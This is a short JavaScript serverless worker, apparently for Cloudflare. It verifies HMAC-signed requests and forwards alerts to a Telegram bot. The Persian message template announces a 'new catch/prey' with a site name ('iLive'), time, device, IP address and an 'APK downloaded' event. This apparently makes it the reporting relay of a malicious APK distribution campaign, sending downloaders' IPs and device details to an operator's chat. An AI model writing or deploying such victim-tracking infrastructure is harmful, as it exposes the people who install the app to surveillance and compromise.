function hexToBytes(hex) {
  if (!/^[0-9a-f]{64}$/i.test(hex)) return null;
  return new Uint8Array(hex.match(/.{2}/g).map((b) => parseInt(b, 16)));
}

export default {
  async fetch(request, env) {
    if (request.method !== "POST") {
      return new Response("Method Not Allowed", { status: 405 });
    }

    const raw = await request.text();
    if (new TextEncoder().encode(raw).byteLength > 8192) {
      return new Response("Payload Too Large", { status: 413 });
    }

    const signature = request.headers.get("X-iLive-Signature") || "";
    const signatureBytes = hexToBytes(signature);
    if (!signatureBytes || !env.RELAY_SECRET) {
      return new Response("Unauthorized", { status: 401 });
    }

    const key = await crypto.subtle.importKey(
      "raw",
      new TextEncoder().encode(env.RELAY_SECRET),
      { name: "HMAC", hash: "SHA-256" },
      false,
      ["verify"]
    );
    const valid = await crypto.subtle.verify(
      "HMAC",
      key,
      signatureBytes,
      new TextEncoder().encode(raw)
    );
    if (!valid) return new Response("Unauthorized", { status: 401 });

    let x;
    try { x = JSON.parse(raw); }
    catch { return new Response("Invalid JSON", { status: 400 }); }

    const clean = (v, max = 180) => String(v ?? "-").replace(/[\r\n]+/g, " ").slice(0, max);
    const text = `🐸 | شکار جدید\n\n🌐 سایت: ${clean(x.site || "iLive")}\n🕒 زمان: ${clean(x.time)}\n📱 دستگاه: ${clean(x.device)}\n🌐 IP: ${clean(x.ip, 64)}\n📥 ${clean(x.event || "APK دانلود شد")}`;

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 8000);
    try {
      const response = await fetch(`https://api.telegram.org/bot${env.TG_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ chat_id: env.TG_CHAT_ID, text }),
        signal: controller.signal
      });
      const body = await response.text();
      return new Response(body, {
        status: response.status,
        headers: { "content-type": "application/json; charset=utf-8" }
      });
    } catch (e) {
      return new Response("Telegram upstream error", { status: 502 });
    } finally {
      clearTimeout(timer);
    }
  }
};
